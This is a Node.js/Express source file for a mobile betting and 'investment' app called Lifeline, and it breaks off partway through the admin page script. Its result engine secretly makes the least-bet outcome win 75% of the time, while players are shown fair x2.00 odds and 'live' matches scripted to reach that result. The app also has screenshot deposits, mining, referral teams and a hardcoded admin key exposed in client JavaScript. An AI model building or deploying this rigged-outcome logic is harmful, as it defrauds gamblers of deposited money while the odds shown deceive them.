const express=require('express');
const mysql=require('mysql2/promise');
const cors=require('cors');
const app=express();
app.use(cors());
app.use(express.json({limit:'50mb'}));
let db;
const ADMIN_KEY="LIFELINE123";

const TEAMS_16 = [
 {name:'Man Utd',short:'MUN', players:['Rashford','Fernandes','Hojlund']},
 {name:'Aston Villa',short:'AVL', players:['Watkins','Bailey','Diaby']},
 {name:'Crystal Palace',short:'CRY', players:['Eze','Olise','Mateta']},
 {name:'Everton',short:'EVE', players:['Calvert-Lewin','Doucoure']},
 {name:'Tottenham',short:'TOT', players:['Son','Richarlison','Maddison']},
 {name:'West Ham',short:'WHU', players:['Bowen','Paqueta','Kudus']},
 {name:'Liverpool',short:'LIV', players:['Salah','Nunez','Diaz']},
 {name:'Wolves',short:'WOL', players:['Cunha','Neto','Hwang']},
 {name:'Arsenal',short:'ARS', players:['Saka','Martinelli','Havertz']},
 {name:'Chelsea',short:'CHE', players:['Palmer','Jackson','Sterling']},
 {name:'Brentford',short:'BRE', players:['Toney','Mbeumo','Wissa']},
 {name:'Brighton',short:'BHA', players:['Mitoma','Ferguson','Pedro']},
 {name:'Man City',short:'MCI', players:['Haaland','Foden','De Bruyne']},
 {name:'Fulham',short:'FUL', players:['Jimenez','Willian','Iwobi']},
 {name:'Newcastle',short:'NEW', players:['Isak','Wilson','Gordon']},
 {name:'Nottingham Forest',short:'NFO', players:['Wood','Gibbs-White','Elanga']},
];

let season=1, matchday=24;
function genMatchday(){
  let shuffled=[...TEAMS_16].sort(()=>Math.random()-0.5);
  let fixtures=[];
  for(let i=0;i<8;i++){
    let home=shuffled[i*2]; let away=shuffled[i*2+1];
    // ALL ODDS x2.00 as you requested
    fixtures.push({
      id:Date.now()+i*1000+Math.floor(Math.random()*9000),
      home, away, homeScore:0, awayScore:0, minute:0,
      odds:{home:'2.00', draw:'2.00', away:'2.00'},
      events:[`0' ${home.short} - ${away.short}`],
      targetResult:null, result:null
    });
  }
  return fixtures;
}
let nextFixtures=genMatchday();
let liveFixtures=null;
let virtualPhase='betting';
let virtualTimeLeft=118;

function randomResult(){ let r=Math.random(); return r<0.38?'home': r<0.65?'draw':'away'; }

// 75% PROFIT LOGIC - House wins 75% of time
async function decideAllResults(fixtures){
  try{
    let totalsByMatch={}; fixtures.forEach(f=> totalsByMatch[f.id]={home:0,draw:0,away:0});
    if(db){
      try{
        const [singleBets]=await db.query("SELECT matchId, prediction, SUM(amount) as total FROM virtual_bets WHERE status='pending' GROUP BY matchId, prediction");
        for(let b of singleBets){ if(totalsByMatch[b.matchId]) totalsByMatch[b.matchId][b.prediction]+=parseInt(b.total)||0; }
      }catch(e){}
      try{
        const [accaRows]=await db.query("SELECT amount, selections FROM virtual_accas WHERE status='pending' AND season=? AND matchday=?",[season, matchday]);
        for(let row of accaRows){
          try{
            let sels=JSON.parse(row.selections);
            let stake=parseInt(row.amount)||0;
            for(let s of sels){ if(totalsByMatch[s.matchId]) totalsByMatch[s.matchId][s.prediction]+=stake; }
          }catch(e){}
        }
      }catch(e){}
    }
    let results=[];
    for(let f of fixtures){
      let t=totalsByMatch[f.id]||{home:0,draw:0,away:0};
      let sum=t.home+t.draw+t.away;
      let res;
      if(sum===0){
        res=randomResult();
      } else {
        // 75% HOUSE PROFIT - pick least bet outcome 75% of time
        let houseWins = Math.random() < 0.75;
        if(houseWins){
          let minVal=Math.min(t.home||0, t.draw||0, t.away||0);
          let candidates=Object.keys(t).filter(k=>t[k]===minVal);
          res=candidates[Math.floor(Math.random()*candidates.length)]||'draw';
        } else {
          let maxVal=Math.max(t.home,t.draw,t.away);
          res=Object.keys(t).find(k=>t[k]===maxVal)||randomResult();
        }
      }
      results.push(res);
    }
    return results;
  }catch(e){ return fixtures.map(()=>randomResult()); }
}

async function settleMatchday(fixtures){
  for(let m of fixtures){
    let res=m.targetResult||m.result;
    if(res==='draw'){ m.homeScore=1; m.awayScore=1; }
    else if(res==='home'){ m.homeScore=2; m.awayScore=1; }
    else { m.homeScore=1; m.awayScore=2; }
    m.result=res;
  }
  try{
    if(db){
      for(let f of fixtures){
        const [bets]=await db.query("SELECT * FROM virtual_bets WHERE matchId=? AND status='pending'",[f.id]);
        for(let bet of bets){
          if(bet.prediction===f.result){
            let win=bet.amount*2; // x2 odds
            await db.query("UPDATE users SET gameBalance=gameBalance+? WHERE id=?",[win, bet.userId]);
            await db.query("UPDATE virtual_bets SET status='won', winAmount=? WHERE id=?",[win, bet.id]);
          } else await db.query("UPDATE virtual_bets SET status='lost', winAmount=0 WHERE id=?",[bet.id]);
        }
      }
      const [accas]=await db.query("SELECT * FROM virtual_accas WHERE season=? AND matchday=? AND status='pending'",[season, matchday]);
      for(let acca of accas){
        let sels=JSON.parse(acca.selections);
        let allWin=true;
        for(let sel of sels){
          let found=fixtures.find(f=> f.id===sel.matchId);
          if(!found || found.result!==sel.prediction){ allWin=false; break; }
        }
        if(allWin){
          let win=Math.floor(acca.amount*acca.odd); // odd = 2^legs
          await db.query("UPDATE users SET gameBalance=gameBalance+? WHERE id=?",[win, acca.userId]);
          await db.query("UPDATE virtual_accas SET status='won', winAmount=? WHERE id=?",[win, acca.id]);
        } else await db.query("UPDATE virtual_accas SET status='lost', winAmount=0 WHERE id=?",[acca.id]);
      }
    }
  }catch(e){}
  matchday++; if(matchday>30) matchday=1;
  nextFixtures=genMatchday();
}

setInterval(async()=>{
  virtualTimeLeft--;
  if(virtualPhase==='betting'){
    if(virtualTimeLeft<=0){
      let targets=await decideAllResults(nextFixtures);
      liveFixtures=nextFixtures.map((f,i)=>{ return {...f, homeScore:0, awayScore:0, minute:0, targetResult:targets[i]}; });
      nextFixtures=[];
      virtualPhase='live';
      virtualTimeLeft=120;
    }
  } else if(virtualPhase==='live'){
    liveFixtures.forEach(m=>{ if(Math.random()<0.08){ if(m.targetResult==='home' && m.homeScore<=m.awayScore) m.homeScore++; else if(m.targetResult==='away' && m.awayScore<=m.homeScore) m.awayScore++; } m.minute++; });
    if(virtualTimeLeft<=0){ await settleMatchday(liveFixtures); virtualPhase='betting'; virtualTimeLeft=118; liveFixtures=null; }
  }
},1000);

async function init(){
 try{
  const u=process.env.DATABASE_URL||process.env.MYSQL_URL;
  if(!u) throw new Error("no db");
  db=mysql.createPool(u+"?connectionLimit=10&keepAlive=true");
  await db.query("CREATE TABLE IF NOT EXISTS users (id INT AUTO_INCREMENT PRIMARY KEY, fullName VARCHAR(100), phone VARCHAR(30), password VARCHAR(100), myReferralCode VARCHAR(20), referredBy VARCHAR(20), balance INT DEFAULT 0, gameBalance INT DEFAULT 0, miningBalance INT DEFAULT 0, referralBonus INT DEFAULT 0)");
  await db.query("CREATE TABLE IF NOT EXISTS deposits (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, phone VARCHAR(30), amount INT, airtelNo VARCHAR(30), screenshot LONGTEXT, status VARCHAR(20) DEFAULT 'pending', createdAt DATETIME DEFAULT CURRENT_TIMESTAMP)");
  await db.query("CREATE TABLE IF NOT EXISTS investments (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, club VARCHAR(50), amount INT, rate INT, lockDays INT, startDate DATETIME DEFAULT CURRENT_TIMESTAMP, status VARCHAR(20) DEFAULT 'active')");
  await db.query("CREATE TABLE IF NOT EXISTS withdrawals (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, amount INT, type VARCHAR(20), status VARCHAR(20) DEFAULT 'pending', createdAt DATETIME DEFAULT CURRENT_TIMESTAMP)");
  await db.query("CREATE TABLE IF NOT EXISTS spins (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, amount INT, createdAt DATETIME DEFAULT CURRENT_TIMESTAMP)");
  await db.query("CREATE TABLE IF NOT EXISTS mining (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, earned INT DEFAULT 0, lastClaim DATETIME DEFAULT CURRENT_TIMESTAMP, isMining TINYINT DEFAULT 0)");
  await db.query("CREATE TABLE IF NOT EXISTS virtual_bets (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, matchId BIGINT, homeTeam VARCHAR(30), awayTeam VARCHAR(30), prediction VARCHAR(10), amount INT, status VARCHAR(20) DEFAULT 'pending', winAmount INT DEFAULT 0, createdAt DATETIME DEFAULT CURRENT_TIMESTAMP)");
  await db.query("CREATE TABLE IF NOT EXISTS virtual_accas (id INT AUTO_INCREMENT PRIMARY KEY, userId INT, season INT, matchday INT, selections TEXT, amount INT, odd FLOAT, status VARCHAR(20) DEFAULT 'pending', winAmount INT DEFAULT 0, createdAt DATETIME DEFAULT CURRENT_TIMESTAMP)");
  console.log("READY x2 ODDS 75% PROFIT");
 }catch(e){ console.log("memory mode", e.message); }
}
init();

const PWA_HEAD = `<link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#000">`;
const FIELD_BG_CSS = `body{background:#080a0f;color:#fff;font-family:Arial;padding:12px;padding-bottom:90px}body::before{content:'';position:fixed;inset:-20px;z-index:-3;background-image:linear-gradient(rgba(0,0,0,0.55),rgba(0,0,0,0.75)),url('https://images.unsplash.com/photo-1522778119026-d647f0596c20?w=1200&q=80');background-size:cover;background-position:center}.glass{background:rgba(18,22,35,0.85);backdrop-filter:blur(16px);border:1px solid rgba(255,215,0,0.15)}.field-logo-top{position:fixed;top:14px;left:50%;transform:translateX(-50%);z-index:10;background:rgba(0,0,0,0.7);border:1px solid gold;padding:6px 18px;border-radius:30px;color:gold;font-size:11px;font-weight:bold}`;

const pages = {
home: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>${FIELD_BG_CSS}input,button{width:100%;padding:14px;margin:8px 0;border-radius:12px;border:none}button{background:gold;font-weight:bold}.card{padding:20px;border-radius:20px}</style></head><body><div class="field-logo-top">16 TEAMS • ALL ODDS x2.00 • 75% PROFIT</div><div class="card glass" style="margin-top:60px"><h2>💎 Lifeline - x2 Odds</h2><input id="n" placeholder="Full Name"><input id="p" placeholder="Phone"><input id="pw" type="password" placeholder="Password"><button onclick="reg()">Register</button><button onclick="log()" style="background:#222;color:#fff">Login</button></div><script>async function reg(){let r=await fetch("/api/register",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({name:n.value,phone:p.value,password:pw.value})});let j=await r.json();if(j.id){localStorage.setItem("uid",j.id);location.href="/dashboard"}else alert(j.error)}async function log(){let r=await fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:p.value,password:pw.value})});let j=await r.json();if(j.id){localStorage.setItem("uid",j.id);location.href="/dashboard"}else alert("Wrong")}</script></body></html>`,

dash: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>
${FIELD_BG_CSS}
.bal{padding:22px;border-radius:24px;text-align:center}
.walletGrid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:12px 0}.walletCard{padding:14px;border-radius:16px;text-align:left}
button{width:100%;padding:14px;margin:7px 0;border-radius:12px;border:none;font-weight:bold}.gold{background:gold;color:#000}.dark{background:rgba(20,25,35,0.9);color:#fff;border:1px solid rgba(255,255,255,0.1)}
#wheelModal{position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:300;display:none;align-items:center;justify-content:center;padding:20px;flex-direction:column}
#wheelCanvas{border-radius:50%;box-shadow:0 0 40px gold;border:6px solid gold;max-width:90vw}
.virtCard{background:linear-gradient(135deg,#1a0033,#000033);border:2px solid #ff00cc;padding:16px;border-radius:18px;margin:12px 0}
</style></head><body>
<div class="field-logo-top" id="topInfo">S1 MD24 • x2.00 ODDS • 16 TEAMS • STADIUM</div>
<div id="wheelModal"><canvas id="wheelCanvas" width="340" height="340"></canvas><button onclick="doSpin()" class="gold" style="max-width:340px;margin-top:15px">SPIN NOW</button><button onclick="closeWheel()" style="background:#333;color:#fff;max-width:340px">Close</button></div>
<div class="bal glass" style="margin-top:60px">
<div class="walletGrid"><div class="walletCard glass"><h4>GAME WALLET</h4><h2 id="gb">0</h2></div><div class="walletCard glass"><h4>INVEST WALLET</h4><h2 id="b">0</h2></div></div>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px"><div class="glass" style="padding:10px;border-radius:12px;text-align:center"><small>INTEREST</small><br><span id="int" style="color:#00ff88;font-weight:bold">0</span></div><div class="glass" style="padding:10px;border-radius:12px;text-align:center"><small>MINING</small><br><span id="mineBal" style="color:#ff00cc;font-weight:bold">0</span></div></div>
<p id="ph" style="color:gold"></p>
</div>
<div class="virtCard" onclick="location.href='/virtual'"><div style="display:flex;justify-content:space-between"><b style="color:#ff00cc">🔥 VIRTUAL x2.00 ODDS - 75% PROFIT</b><span id="virtPhase" style="background:#00ff88;color:#000;padding:4px 10px;border-radius:20px;font-size:10px">BETTING</span></div><div id="virtPreview" style="margin-top:10px">8 Matches • All odds x2.00 • 1 leg x2, 8 legs x256</div><div style="text-align:center;margin-top:8px">⏱️ <span id="virtTimer">01:58</span> • Tap to bet →</div></div>
<button class="gold" onclick="openWheel()">🎡 SPIN WHEEL - Win up to 2000</button>
<button class="dark" onclick="startMining()" id="mineBtn">⛏️ Start Mining (2 UGX/min)</button>
<button class="gold" onclick="location.href='/virtual'">⚽ PLAY VIRTUAL - x2.00 ODDS</button>
<button class="dark" onclick="location.href='/deposit'">💰 Deposit</button>
<button class="dark" onclick="location.href='/invest'">📈 Invest</button>
<button class="dark" onclick="location.href='/history'">📜 History</button>
<button class="dark" onclick="location.href='/referral'">👥 My Team</button>
<script>
let uid=localStorage.getItem("uid");if(!uid)location.href="/";
function openWheel(){ document.getElementById('wheelModal').style.display='flex'; drawWheel(); }
function closeWheel(){ document.getElementById('wheelModal').style.display='none'; }
function drawWheel(){ let c=document.getElementById('wheelCanvas'); let ctx=c.getContext('2d'); let prizes=[0,100,200,300,500,1000,2000,100]; let colors=['#222','#ffcc00','#00ff88','#ff00cc','#00ccff','#ff6600','#ffd700','#444']; let angle=0; for(let i=0;i<prizes.length;i++){ ctx.beginPath(); ctx.moveTo(170,170); ctx.fillStyle=colors[i]; ctx.arc(170,170,160, angle, angle+Math.PI*2/prizes.length); ctx.lineTo(170,170); ctx.fill(); ctx.save(); ctx.translate(170,170); ctx.rotate(angle+Math.PI/prizes.length); ctx.fillStyle='#fff'; ctx.font='bold 14px Arial'; ctx.fillText(prizes[i]+' UGX', 60, 5); ctx.restore(); angle+=Math.PI*2/prizes.length; } }
async function doSpin(){ let r=await fetch("/api/spin",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid})}); let j=await r.json(); alert(j.win!==undefined? "Won "+j.win+" UGX!" : j.error); closeWheel(); load(); }
async function startMining(){ let r=await fetch("/api/mining/start",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid})}); alert("Mining started!"); load(); }
async function load(){ try{ let r=await fetch("/api/user/"+uid);let u=await r.json(); document.getElementById('b').textContent=(u.balance||0).toLocaleString(); document.getElementById('gb').textContent=(u.gameBalance||0).toLocaleString(); document.getElementById('mineBal').textContent=(u.miningBalance||0).toLocaleString(); document.getElementById('ph').textContent=u.phone||""; document.getElementById('int').textContent=(u.totalInterest||0).toLocaleString(); }catch(e){} }
async function loadVirtualPreview(){ try{ let r=await fetch("/api/virtual/status"); let d=await r.json(); document.getElementById('virtPhase').textContent=d.phase.toUpperCase(); document.getElementById('virtTimer').textContent=Math.floor(d.timeLeft/60)+":"+String(d.timeLeft%60).padStart(2,'0'); }catch(e){} }
load(); setInterval(loadVirtualPreview,1000); loadVirtualPreview();
</script></body></html>`,

virtual: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>
body{margin:0;background:#121212;color:#fff;font-family:Arial,sans-serif;padding-bottom:130px}
.topBar{background:#1e1e1e;padding:12px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:20;border-bottom:1px solid #2a2a2a}
.countDown{color:#ff6b00;font-weight:bold}
.matchCard{background:#1e1e1e;margin:8px 10px;border-radius:10px;padding:12px 14px}
.teams{font-weight:700;font-size:13px;margin-bottom:10px}
.oddsRow{display:flex;gap:8px}
.oddBox{flex:1;background:#2a2a2a;border-radius:8px;padding:12px 8px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;border:1px solid transparent}
.oddBox.sel{background:#1a3d1a;border-color:#00c853;box-shadow:0 0 0 1px #00c853 inset}
.oddLabel{font-size:12px;color:#999}.oddValue{font-size:15px;font-weight:900;color:#fff}
.betSlipBar{position:fixed;bottom:52px;left:0;right:0;background:#b2ff00;color:#000;padding:12px 16px;display:flex;justify-content:space-between;z-index:30;font-weight:800;cursor:pointer}
.bottomNav{position:fixed;bottom:0;left:0;right:0;background:#1e1e1e;display:flex;justify-content:space-around;padding:8px 0;border-top:1px solid #2a2a2a;z-index:31}
.accaSheet{position:fixed;bottom:0;left:0;right:0;background:#1e1e1e;border-radius:18px 18px 0 0;max-height:80vh;overflow-y:auto;z-index:40;display:none;padding:16px;border-top:2px solid gold}
</style></head><body>
<div class="topBar"><a href="/dashboard" style="color:#fff;text-decoration:none;font-size:20px">‹</a><span id="mdText">Matchday 24 • Starts in: <span id="timer" class="countDown">01:58</span> • All odds x2.00</span><span>⚙</span></div>
<div id="list">Loading 8 matches x2.00...</div>
<div class="betSlipBar" id="betBar" onclick="openSlip()">Add legs for up to a <b>1250% Bonus (x2.00 each)</b> <span style="background:#000;color:#b2ff00;padding:4px 10px;border-radius:12px" id="legsCount">0 legs</span></div>
<div class="bottomNav"><div style="color:#888;font-size:10px;text-align:center">Menu</div><div style="color:#fff;font-size:10px;text-align:center">⚽<br>Sports</div><div style="color:#888;font-size:10px;text-align:center">Betslip</div><div style="color:#888;font-size:10px;text-align:center">My bets</div><div style="color:#888;font-size:10px;text-align:center">Account</div></div>
<div class="accaSheet" id="accaSheet">
<h3 style="margin:0;color:gold">🎫 Betslip x2.00 - <span id="selCount">0</span> legs</h3>
<div style="font-size:12px;margin:8px 0">Each leg x2.00 • Odd: <b id="odd">x0</b> • Potential: <b id="pot" style="color:#00ff88">0</b></div>
<div id="selList"></div>
<input id="accaAmt" type="number" value="500" style="width:100%;padding:12px;border-radius:10px;border:1px solid gold;background:#111;color:#fff;margin:10px 0">
<button onclick="placeAcca()" style="width:100%;padding:14px;background:gold;border:none;border-radius:12px;font-weight:900">Place Bet x2.00 - Win x<span id="oddBtn">0</span>!</button>
<button onclick="closeSlip()" style="width:100%;padding:10px;background:#2a2a2a;color:#fff;border:none;border-radius:10px;margin-top:8px">Close</button>
<p style="font-size:11px;color:#888">Game Wallet: <span id="gBal">0</span> UGX • 1 leg x2, 2 legs x4, 8 legs x256</p>
</div>
<script>
let uid=localStorage.getItem("uid");
let selections=[];
let localTimeLeft=118;
let curMD=24;
let curPhase='betting';
let FALLBACK=[
  {id:101, home:{name:'Man Utd',short:'MUN'}, away:{name:'Aston Villa',short:'AVL'}, odds:{home:'2.00',draw:'2.00',away:'2.00'}, homeScore:0, awayScore:0, minute:0},
  {id:102, home:{name:'Crystal Palace',short:'CRY'}, away:{name:'Everton',short:'EVE'}, odds:{home:'2.00',draw:'2.00',away:'2.00'}, homeScore:0, awayScore:0, minute:0},
  {id:103, home:{name:'Tottenham',short:'TOT'}, away:{name:'West Ham',short:'WHU'}, odds:{home:'2.00',draw:'2.00',away:'2.00'}, homeScore:0, awayScore:0, minute:0},
  {id:104, home:{name:'Liverpool',short:'LIV'}, away:{name:'Wolves',short:'WOL'}, odds:{home:'2.00',draw:'2.00',away:'2.00'}, homeScore:0, awayScore:0, minute:0},
  {id:105, home:{name:'Arsenal',short:'ARS'}, away:{name:'Chelsea',short:'CHE'}, odds:{home:'2.00',draw:'2.00',away:'2.00'}, homeScore:0, awayScore:0, minute:0},
  {id:106, home:{name:'Brentford',short:'BRE'}, away:{name:'Brighton',short:'BHA'}, odds:{home:'2.00',draw:'2.00',away:'2.00'}, homeScore:0, awayScore:0, minute:0},
  {id:107, home:{name:'Man City',short:'MCI'}, away:{name:'Fulham',short:'FUL'}, odds:{home:'2.00',draw:'2.00',away:'2.00'}, homeScore:0, awayScore:0, minute:0},
  {id:108, home:{name:'Newcastle',short:'NEW'}, away:{name:'Nottingham Forest',short:'NFO'}, odds:{home:'2.00',draw:'2.00',away:'2.00'}, homeScore:0, awayScore:0, minute:0},
];
function formatTime(s){ if(s<0) s=0; let m=Math.floor(s/60).toString().padStart(2,'0'); let sec=(s%60).toString().padStart(2,'0'); return m+":"+sec; }
function toggleSel(matchId, homeTeam, awayTeam, homeShort, awayShort, pred){
  let ex=selections.findIndex(s=>s.matchId===matchId);
  if(ex!==-1){ if(selections[ex].prediction===pred){ selections.splice(ex,1); } else { selections[ex].prediction=pred; } }
  else { if(selections.length>=15){ alert("Max 15"); return; } selections.push({matchId, homeTeam, awayTeam, homeShort, awayShort, prediction:pred}); }
  renderSel();
}
function renderSel(){
  document.querySelectorAll('.oddBox').forEach(b=>b.classList.remove('sel'));
  selections.forEach(s=>{ let el=document.querySelector('[data-match="'+s.matchId+'"][data-pred="'+s.prediction+'"]'); if(el) el.classList.add('sel'); });
  document.getElementById('selCount').textContent=selections.length;
  document.getElementById('legsCount').textContent=selections.length+" legs";
  let odd = selections.length>=1? Math.pow(2, selections.length) : 0;
  if(selections.length===8) odd=256;
  document.getElementById('odd').textContent='x'+odd.toFixed(2);
  document.getElementById('oddBtn').textContent=odd.toFixed(2);
  let amt=parseInt(document.getElementById('accaAmt').value)||0; document.getElementById('pot').textContent=Math.floor(amt*odd).toLocaleString()+' UGX';
  let list=selections.map(s=>'<div style="display:flex;justify-content:space-between;background:#2a2a2a;padding:8px;border-radius:8px;margin:4px 0;font-size:12px"><span>'+s.homeShort+' - '+s.awayShort+' → '+s.prediction.toUpperCase()+' @2.00</span><span style="color:red;cursor:pointer" onclick="removeSel('+s.matchId+')">✕</span></div>').join('');
  document.getElementById('selList').innerHTML=list||'<small style=color:#888>Tap 1, X, or 2 - All odds x2.00 • 1 leg x2, 8 legs x256</small>';
}
function removeSel(mid){ selections=selections.filter(s=>s.matchId!==mid); renderSel(); }
function openSlip(){ document.getElementById('accaSheet').style.display='block'; }
function closeSlip(){ document.getElementById('accaSheet').style.display='none'; }
document.getElementById('accaAmt').addEventListener('input',renderSel);
async function placeAcca(){
  if(selections.length<1) return alert("Add at least 1!");
  let amt=parseInt(document.getElementById('accaAmt').value); if(amt<200) return alert("Min 200");
  try{
    let r=await fetch("/api/virtual/bet/acca",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid, amount:amt, selections: selections.map(s=>({matchId:s.matchId, homeTeam:s.homeTeam, awayTeam:s.awayTeam, prediction:s.prediction}))})});
    let j=await r.json(); if(j.ok){ alert("Bet placed! "+selections.length+" legs x2.00 = x"+j.odd.toFixed(2)); selections=[]; renderSel(); closeSlip(); } else alert(j.error);
  }catch(e){ alert(e.message); }
}
function renderFixtures(fixtures, phase){
  let html='';
  fixtures.forEach(m=>{
    let isLive = phase!=='betting';
    html+='<div class=matchCard><div class=teams>'+m.home.short+' - '+m.away.short+' '+(isLive?'<span style="background:#000;padding:4px 8px;border-radius:8px;color:#0f0;font-size:11px;margin-left:8px">'+m.homeScore+'-'+m.awayScore+' '+m.minute+"'" +'</span>':'')+'</div><div class=oddsRow>'+
    '<div class="oddBox" data-match="'+m.id+'" data-pred="home" onclick="toggleSel('+m.id+",'"+m.home.name+"','"+m.away.name+"','"+m.home.short+"','"+m.away.short+"','home')"+'"><span class=oddLabel>1</span><span class=oddValue>2.00</span></div>'+
    '<div class="oddBox" data-match="'+m.id+'" data-pred="draw" onclick="toggleSel('+m.id+",'"+m.home.name+"','"+m.away.name+"','"+m.home.short+"','"+m.away.short+"','draw')"+'"><span class=oddLabel>X</span><span class=oddValue>2.00</span></div>'+
    '<div class="oddBox" data-match="'+m.id+'" data-pred="away" onclick="toggleSel('+m.id+",'"+m.home.name+"','"+m.away.name+"','"+m.home.short+"','"+m.away.short+"','away')"+'"><span class=oddLabel>2</span><span class=oddValue>2.00</span> ›</div>'+
    '</div></div>';
  });
  document.getElementById('list').innerHTML=html;
  renderSel();
}
function tick(){
  localTimeLeft--;
  if(localTimeLeft<0) localTimeLeft=0;
  document.getElementById('timer').textContent=formatTime(localTimeLeft);
  document.getElementById('mdText').innerHTML='Matchday '+curMD+' • '+(curPhase==='betting'?'Starts in: <span class=countDown>'+formatTime(localTimeLeft)+'</span> • All odds x2.00':'<span style=color:red>● LIVE '+formatTime(localTimeLeft)+'</span>');
}
async function loadS(){
 try{
  let r=await fetch("/api/virtual/status");
  let d=await r.json();
  curMD=d.matchday||24; curPhase=d.phase; localTimeLeft=d.timeLeft;
  let fixtures = d.phase==='betting'? (d.nextAll && d.nextAll.length? d.nextAll : FALLBACK) : (d.allLive && d.allLive.length? d.allLive : FALLBACK);
  renderFixtures(fixtures, d.phase);
 }catch(e){ renderFixtures(FALLBACK, 'betting'); }
}
setInterval(tick,1000);
setInterval(loadS,3000);
loadS();
async function loadBal(){ try{ let r=await fetch("/api/user/"+uid); let u=await r.json(); document.getElementById('gBal').textContent=(u.gameBalance||0).toLocaleString(); }catch(e){} }
loadBal();
</script></body></html>`,

deposit: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>${FIELD_BG_CSS}input,button{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:none}button{background:gold;font-weight:bold}</style></head><body><div class="field-logo-top">DEPOSIT</div><a href="/dashboard" style="color:gold;margin-top:60px;display:inline-block">← Back</a><h2>Deposit</h2><input id="am" placeholder="Amount"><input id="air" placeholder="Airtel Number"><input type="file" id="file"><button onclick="dep()">Submit</button><script>let uid=localStorage.getItem("uid");let b64=""; file.addEventListener("change",e=>{let r=new FileReader();r.onload=()=>{b64=r.result};r.readAsDataURL(e.target.files[0])});async function dep(){let r=await fetch("/api/deposit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid,amount:am.value,airtelNo:air.value,screenshot:b64})});let j=await r.json();if(j.ok)location.href="/dashboard";else alert(j.error)}</script></body></html>`,
invest: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>${FIELD_BG_CSS}input,button{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:none}button{background:gold}</style></head><body><div class="field-logo-top">INVEST</div><a href="/dashboard" style="color:gold;margin-top:60px;display:inline-block">← Back</a><h2>Invest</h2><p>Bal: <b id="bal">0</b></p><input id="a" placeholder="Amount"><button onclick="inv()">Invest</button><script>let uid=localStorage.getItem("uid");async function load(){let r=await fetch("/api/user/"+uid);let u=await r.json();bal.textContent=u.balance;}async function inv(){let r=await fetch("/api/invest",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid,club:'arsenal',amount:parseInt(a.value)})});let j=await r.json();if(j.ok)location.href="/dashboard";else alert(j.error)}load()</script></body></html>`,
history: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>${FIELD_BG_CSS}.card{background:#1a1f2e;border:1px solid gold;padding:14px;margin:8px 0;border-radius:12px;display:flex;justify-content:space-between}a{color:gold}</style></head><body><div class="field-logo-top">HISTORY</div><div style="margin-top:60px"><a href="/dashboard">← Back</a><h2>History</h2><div id="list">Loading...</div></div><script>let uid=localStorage.getItem("uid");async function load(){let r=await fetch("/api/history/"+uid);let d=await r.json();let h="";for(let t of d){h+="<div class=card><span>"+t.type+" "+(t.amount||0)+"</span><span>"+(t.status||'')+"</span></div>";}document.getElementById('list').innerHTML=h||"No data";}load()</script></body></html>`,
referral: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${PWA_HEAD}<style>${FIELD_BG_CSS}.card{padding:15px;border-radius:12px;margin:10px 0;text-align:center}button{width:100%;padding:12px;border-radius:8px;border:none;background:gold;font-weight:bold;margin:5px 0}input{width:100%;padding:12px;border-radius:8px;border:none;background:#111;color:#fff;text-align:center}a{color:gold}</style></head><body><div class="field-logo-top">TEAM</div><div style="margin-top:60px"><a href="/dashboard">Back</a><h2>My Team</h2><div class="card glass"><h3>Code: <span id="code">---</span></h3><input id="link" readonly><button onclick="copy()">Copy</button></div><div id="team"></div></div><script>let uid=localStorage.getItem("uid");async function load(){let r=await fetch("/api/team/"+uid);let j=await r.json();code.textContent=j.code;link.value=location.origin+"/?ref="+j.code;let html="";for(let t of j.team){html+="<div class=card glass style=text-align:left>"+t.phone+"</div>"}team.innerHTML=html||"No team";}function copy(){link.select();document.execCommand("copy");alert("Copied!")}load()</script></body></html>`,
admin: `<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin - 75% Profit</title><style>body{background:#000;color:#fff;padding:15px;font-family:Arial}input,button{width:100%;padding:10px;margin:5px 0;border-radius:8px;border:none}button{background:gold;font-weight:bold}.card{background:#111;padding:12px;margin:8px 0;border-radius:10px;border-left:4px solid gold}.profitBox{background:linear-gradient(90deg,#FFD700,#FFA500);color:#000;padding:16px;border-radius:12px;font-weight:900;text-align:center;margin:12px 0}.tab{padding:10px;background:#222;display:inline-block;margin:5px;border-radius:5px;cursor:pointer}.active{background:gold;color:#000}</style></head><body>
<div id="loginBox"><h2>Admin Login - 75% Profit System</h2><input id="pass" type="password" placeholder="Enter Admin Key"><button onclick="check()">Unlock</button></div>
<div id="adminBox" style="display:none">
<h2>🏆 LIFELINE ADMIN - 75% PROFIT MODE</h2>
<div class="profitBox" id="profitBox">Calculating 75% profit...</div>
<div><span class="tab active" onclick="showTab('dep')">Deposits</span><span class="tab" onclick="showTab('virt')">Virtual Bets (75% Profit)</span></div>
<div id="depBox"><div id="l">Loading deposits...</div></div>
<div id="virtBox" style="display:none"><div id="lvirt">Loading virtual...</div></div>
</div>
<script>
const AP="LIFELINE123";let en="";
